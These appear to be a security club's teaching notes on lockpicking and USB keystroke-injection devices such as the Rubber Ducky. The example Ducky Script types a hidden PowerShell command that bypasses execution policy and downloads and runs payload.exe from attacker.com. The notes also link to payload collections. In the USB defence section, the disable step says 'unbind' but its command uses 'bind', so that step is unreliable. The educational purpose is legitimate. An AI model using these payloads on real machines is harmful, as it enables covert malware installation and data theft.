---
title: "Meeting_3"
author: ""
type: ""
date: 2023-09-27T17:49:47-04:00
subtitle: ""
image: ""
tags: []
---
# Meeting 3: Physical Security


## Table of Contents
- [Lockpicking](#lockpicking)
  * [Introduction to Lockpicking](#introduction-to-lockpicking)
  * [Common Tools and Their Uses](#common-tools-and-their-uses)
  * [Lockpicking Techniques](#lockpicking-techniques)
  * [Ethical Considerations](#ethical-considerations)
- [Devices](#devices)
  * [Rubber Duckies](#rubber-duckies)
  * [Ducky Script](#ducky-script)
  * [Creative Devices](#creative-devices)
  * [Defending Yourself from USB Attacks](#defending-yourself-from-usb-attacks)

## Lockpicking
<https://simmer.io/@Xill/lockpick-simulator>
Move the tool with Q, E, WASD, and use the slider on the bottom to increase tension.

### Introduction to Lockpicking

Lockpicking is the art of manipulating the components of a mechanical lock without the original key to open it. While often associated with criminal intent, lockpicking is an essential skill for certain professions like locksmithing, and can be a fulfilling hobby for many enthusiasts.

### Common Tools and Their Uses

- **Tension Wrench:** A tool used to apply rotational tension on the lock cylinder. This tension causes the lock pins to bind, allowing the picker to manipulate them.
  
- **Hook Picks:** These tools are used to individually set pins inside the lock.
  
- **Ball Picks:** Used for wafer locks, the ball shape allows manipulation of multiple wafers at once.
  
- **Diamond Picks:** Suitable for both wafer and pin tumbler locks. The shape helps in raking and single pin picking.
  
- **Rakes:** Tools like the Bogota or the snake rake are moved in and out of the lock to quickly set multiple pins at once. Raking is faster but less precise than single pin picking.

### Lockpicking Techniques

1. **Single Pin Picking (SPP):** A technique where each pin is set individually. This is the most versatile method but requires practice.
  
2. **Raking:** A faster method than SPP. The rake is moved in and out of the lock, attempting to set multiple pins at once. It's less precise but can open many locks in seconds.

3. **Bumping:** Using a specially cut key, the lock is "bumped" causing the pins to jump, allowing the lock to turn. Not all locks are vulnerable to this technique.

4. **Impressioning:** A method where a blank key is inserted into the lock and manipulated to leave marks indicating where cuts should be made.

## Devices
### Rubber Duckies
Popularized by Hak5, this is a common language for keystroke injector tools.

Some keystroke injectors double as both a real USB and a keystroke injector, so the victim won't notice the difference. 
#### Installing Script Emulator
We would like to use this program <https://github.com/taibhse-designs/DuckyEmulator>

So we get it with 

`git clone https://github.com/taibhse-designs/DuckyEmulator.git`

Go into the following directory with this command

`cd DuckyEmulator/src/duckyemulator`

Run the following command in the `duckyemulator` directory

`curl https://dlcdn.apache.org//commons/codec/binaries/commons-codec-1.16.0-bin.tar.gz -o commons-codec-1.16.0-bin.tar.gz`

Extract the library with

`tar -xzf commons-codec-1.16.0-bin.tar.gz `

And compile the java code with

`javac -cp .:commons-codec-1.16.0/commons-codec-1.16.0.jar *.java`

From the `duckyemulator` directory: `java -cp .:duckyemulator/commons-codec-1.16.0/commons-codec-1.16.0.jar duckyemulator.DuckyEmulator`


### Ducky Script
Simple .txt files. 

#### Ducky Payloads
+ <https://github.com/hak5/usbrubberducky-payloads/tree/master>
+ <https://shop.hak5.org/blogs/payloads>

+ REM: Used for comments. It doesn't affect the script's execution.
```ducky
REM This is a comment
```
+ DELAY: Pauses the script for a specified number of millisecond
```
DELAY 1000  REM Waits for 1 second
```
+ STRING: Types the subsequent string of characters as if typed on a keyboard.
```
STRING Hello, World!
```
+ ENTER (or RETURN): Simulates pressing the Enter key.
```
ENTER
```
+ GUI (or WINDOWS or COMMAND): Simulates pressing the Windows key (on Windows) or Command key (on macOS).
```
GUI r  REM Opens the Run dialog on Windows
```
+ ALT, CONTROL (or CTRL), SHIFT: Modifier keys used in combination with other keys.
```
CONTROL ALT DELETE  REM Sends the Ctrl+Alt+Del command
```

##### Example Payloads
+ Payload Delivery: Use Ducky Script to automate the process of downloading and executing a payload from a remote server.
```
REM Open a command prompt
GUI r
STRING cmd
ENTER
DELAY 500
REM Download and execute payload
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri 'http://attacker.com/payload.exe' -OutFile 'C:\temp\payload.exe'; Start-Process 'C:\temp\payload.exe'"
ENTER
```
+ Information Gathering: Quickly execute commands to gather system information and save to a file or exfiltrate.
```
REM Gather system info using systeminfo command
GUI r
STRING cmd
ENTER
DELAY 500
STRING systeminfo > C:\temp\info.txt
ENTER
```

### Creative Devices
Cables:
+ <https://zsecurity.org/product/badusb-c-keystroke-injection-cable/>
+ <https://shop.hak5.org/products/omg-cable>

Bash Bunny:
+ <https://shop.hak5.org/products/bash-bunny>
+ <https://github.com/hak5/bashbunny-payloads>

### Defending yourself from USB Attacks
#### Turning off your ports
+ Windows Device Manager
+ Linux Mint
    1. Run `lsusb` to determine the bus and device number of the USB device you want to disable.
    2. To disable the device, echo the bus and device number to `/sys/bus/usb/drivers/usb/unbind`. For example, if your device is on bus 2 and its device ID is 1, you would run:
    
    ```bash
    echo '2-1' | sudo tee /sys/bus/usb/drivers/usb/bind
    ```

    3. To re-enable the device, echo the bus and device number to `/sys/bus/usb/drivers/usb/bind`:

    ```bash
    echo '2-1' | sudo tee /sys/bus/usb/drivers/usb/bind
    ```



